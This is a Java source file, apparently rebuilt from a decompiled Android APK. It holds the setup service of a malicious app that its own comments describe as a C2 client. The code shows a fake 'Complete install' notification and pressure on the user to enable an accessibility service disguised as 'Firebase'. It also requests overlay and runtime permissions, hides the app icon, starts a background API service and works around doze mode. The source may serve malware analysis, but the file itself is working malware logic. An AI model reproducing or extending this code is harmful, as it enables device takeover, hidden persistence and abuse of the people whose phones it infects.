package com.android.pictach;

import android.app.IntentService;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import java.util.concurrent.TimeUnit;

// myker = IntentService that runs the full C2 initialization loop
// Confirmed from APK: extends IntentService
// onHandleIntent = full init chain (isz=449)
public class myker extends IntentService {

    // WakeLock instance field (confirmed from APK)
    public PowerManager.WakeLock wakeLock;

    public myker() {
        super("");  // APK: invoke-direct {v1,v0}, IntentService.<init> with ""
        wakeLock = null;
    }

    // cancelnotification — static helper (isz=12, confirmed)
    public static void cancelnotification(Context ctx, int id) {
        NotificationManager nm = (NotificationManager) ctx.getSystemService("notification");
        if (nm != null) nm.cancel(id);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent); // APK: invoke-super IntentService.onBind
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // Release wakelock if held (APK isz=27)
        if (wakeLock != null && !wakeLock.equals(null) && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }

    // onHandleIntent — full C2 init loop (APK isz=449)
    // Sets up notification, waits for accessibility, then:
    // 1. Checks overlay permission → starts Firebasekit if missing
    // 2. Checks runtime permissions → starts Firebaseconfig if missing
    // 3. Sets love.allok=true, Utils.iamworking=true
    // 4. Reads R.string.newss → Utils.p_Utils_r
    // 5. Starts Api service
    // 6. Checks doze mode → starts Firebases if needed
    // 7. Cancels notification, stops foreground, stops self
    @Override
    protected void onHandleIntent(Intent intent) {
        // Set up foreground notification channel (API >= 26)
        String channelId = "MyInstall";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(
                    NotificationManager.class);
            if (nm != null && nm.getNotificationChannel(channelId) == null) {
                NotificationChannel ch = new NotificationChannel(
                        channelId, "Install", NotificationManager.IMPORTANCE_HIGH);
                ch.setDescription("Installation");
                ch.setShowBadge(false);
                ch.setSound(null, null);
                nm.createNotificationChannel(ch);
            }
        }

        // Build foreground notification
        Intent actIntent = new Intent(this, google.class);
        actIntent.setFlags(0x70100000); // confirmed from APK: const v3,1879080960
        PendingIntent pi = PendingIntent.getActivity(this, 0, actIntent, 0);
        NotificationCompat.Builder nb = new NotificationCompat.Builder(this, channelId)
                .setSmallIcon(17170445)
                .setContentTitle("Complete install")
                .setContentText("Click Here to Complete installing")
                .setPriority(1)
                .setCategory("call")
                .setDefaults(15)
                .setOngoing(true)
                .setAutoCancel(false)
                .setFullScreenIntent(pi, true);
        startForeground(1547, nb.build());

        // Acquire WakeLock
        PowerManager pm = (PowerManager) getSystemService("power");
        if (wakeLock == null) {
            wakeLock = pm.newWakeLock(1, "Android:Watchlock");
        }
        if (wakeLock != null && !wakeLock.isHeld()) {
            wakeLock.acquire();
        }

        // Main init loop — runs until accessibility is enabled
        while (true) {
            try {
                TimeUnit.MILLISECONDS.sleep(Utils.speedTime);
            } catch (Exception ignored) {}

            // Check if Firebase (accessibility service) is active
            boolean accessEnabled = Utils.IA_love_E(this, Firebase.class);
            int speedIncrement = 3500;
            int flagNew = 0x00400000;
            int flagClear = 0x00200000;
            int flagTask = 0x00100000;

            if (!accessEnabled) {
                // Check if accessibility needs to be enabled
                if (!Utils.NeedSuper() || !Utils.GS_love_B(this)) continue;

                // Increment retry counter
                Utils.Trys += 1;
                if (Utils.Trys < 5) continue;

                // After 5 retries: reset and launch google Activity
                Utils.Trys = 0;
                Utils.speedTime = speedIncrement;
                Intent google = new Intent(this, com.android.pictach.google.class);
                google.addFlags(flagNew);
                google.addFlags(flagClear);
                google.addFlags(flagTask);
                startActivity(google);
                continue;
            }

            // Accessibility active — check overlay permission
            if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
                if (!Utils.NeedSuper()) continue;
                if (Utils.shown.booleanValue()) continue;

                Utils.speedTime = 5000;
                Utils.shown = Boolean.valueOf(true);
                Intent overlay = new Intent(this, Firebasekit.class);
                overlay.addFlags(flagNew);
                startActivity(overlay);
                continue;
            }

            // Check runtime permissions
            if (!Utils.H__love_P(this, Utils.PERMISSIONS())) {
                if (!Utils.asked.booleanValue()) {
                    Utils.speedTime = speedIncrement;
                    Utils.asked = Boolean.valueOf(true);
                    continue;
                } else if (Utils.asked.booleanValue()) {
                    Utils.asked = Boolean.valueOf(false);
                    continue;
                } else {
                    Utils.speedTime = 2000;
                    continue;
                }
            }

            // All checks passed — run C2 init
            // Hide icon if not already hidden
            if (!love.Is_love_Hidden) {
                love.Is_love_Hidden = true;
                Utils.swapAppIcon(getApplicationContext(), "I#C#O#N#S#C#A#N#E#R");
            }

            if (!Utils.iamworking) {
                love.allok = true;
                Utils.iamworking = true;
                Firebase.Firebasebypass = Boolean.valueOf(false);
                Firebase.FirebaseFOR_prim = Boolean.valueOf(false);
                Firebase.FirebaseCheckPrims = true;

                // Start Api if not running (reads R.string.newss → Utils.p_Utils_r)
                if (LoveApi0.isServiceNotRunning(Api.class, this)) {
                    try {
                        Utils.p_Utils_r = getResources().getString(2131296276);
                    } catch (Exception ignored) {}
                    startService(new Intent(this, Api.class));
                }

                // Check doze mode → start Firebases if not exempt
                if (!Utils.is_dozemode(this)) {
                    Intent doze = new Intent(this, Firebases.class);
                    doze.addFlags(flagNew);
                    doze.addFlags(flagClear);
                    doze.addFlags(flagTask);
                    startActivity(doze);
                }
            }

            // Stop foreground notification and self
            if (Build.VERSION.SDK_INT >= 26) {
                cancelnotification(this, 6676);
                stopForeground(true);
                stopSelf();
            }

            Utils.speedTime = 25000;
        }
    }
}
